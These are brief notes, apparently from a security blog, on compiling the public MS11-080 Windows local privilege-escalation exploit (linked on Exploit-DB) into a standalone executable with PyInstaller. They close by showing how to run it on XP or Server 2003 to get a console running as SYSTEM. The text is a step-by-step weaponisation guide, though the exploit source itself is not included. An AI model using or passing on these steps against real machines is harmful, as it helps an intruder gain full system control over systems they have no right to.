http://www.exploit-db.com/exploits/18176/

Python environment setup:
 1. Install Python
 2. Install PyInstaller
 3. Install PyWin32 (specific to the version of Python installed above)
PyInstaller compile:
 1. Download the python exploit code to c:\Temp\ms11-080.py
 2. c:> PATH=C:\<Path to python.exe>
 3. c:> cd <Path to PyInstaller.exe>
 4. c:> Python Configure.py
 5. c:> Python Makespec.py --onefile c:\Temp\ms11-080.py
            (creates \ms11-080\ms11-080.spec)
 6. c:> Python Build.py \ms11-080\ms11-080.spec
            (creates \ms11-080\dist\ms11-080.exe)
This will work fine for a gui session. Just run the executable from a command line (ms11-080.exe -O <XP|2K3>), and a nice red console is spawned, running as SYSTEM.


http://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html